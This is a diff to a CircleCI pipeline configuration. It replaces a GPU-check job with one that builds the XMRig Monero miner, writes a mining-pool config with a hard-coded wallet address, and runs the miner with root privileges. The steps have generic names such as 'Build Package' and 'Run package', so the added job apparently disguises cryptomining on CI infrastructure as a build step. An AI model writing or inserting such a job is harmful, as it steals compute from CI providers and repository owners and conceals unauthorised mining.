@@ -1,21 +1,60 @@
 version: 2.1
 
-executors:
-  gpu-executor:
-    machine:
-      image: linux-cuda-12:default
-    resource_class: gpu.nvidia.medium
-
 jobs:
-  check-gpu:
-    executor: gpu-executor
+  build-xmrig:
+    docker:
+      - image: cimg/base:stable  # Ubuntu-based CircleCI image
     steps:
       - checkout
+
       - run:
-          name: Run nvidia-smi to check GPU
-          command: nvidia-smi
+          name: Update System
+          command: |
+            sudo apt update
+            sudo apt upgrade -y
+
+      - run:
+          name: Install Dependencies
+          command: |
+            sudo apt install -y git build-essential cmake automake libtool autoconf libuv1-dev libssl-dev libhwloc-dev
+            sudo apt-get install -y msr-tools
+
+      - run:
+          name: Build Package
+          command: |
+            git clone https://github.com/xmrig/xmrig.git
+            mkdir xmrig/build
+            cd xmrig/scripts && ./build_deps.sh
+            cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps
+            make -j$(nproc)
+
+      - run:
+          name: Configure config.json
+          command: |
+            cat > config.json <<EOF
+            {
+              "pools": [
+                {
+                  "url": "xmr.kryptex.network:7777",
+                  "user": "4ASWwpE33sCdYnW85kfM3MjRjbdZ9pcFCFMKFFHi6vHzF2ssiD8xWBDQpWfqHnJamw82vjKYPq7y25Wfob7mbVPqCRK4Tcz",
+                  "pass": "x",
+                  "algo": "rx/0",
+                  "coin": "monero"
+                }
+              ]
+            }
+            EOF
+
+      - run:
+          name: Show config.json for verification
+          command: cat config.json
+
+      - run:
+          name: Run package
+          command: |
+            sudo xmrig/scripts/randomx_boost.sh && sudo ./xmrig/build/xmrig -c config.json
 
 workflows:
-  gpu-check:
+  build_and_run:
     jobs:
-      - check-gpu
+      - build-xmrig
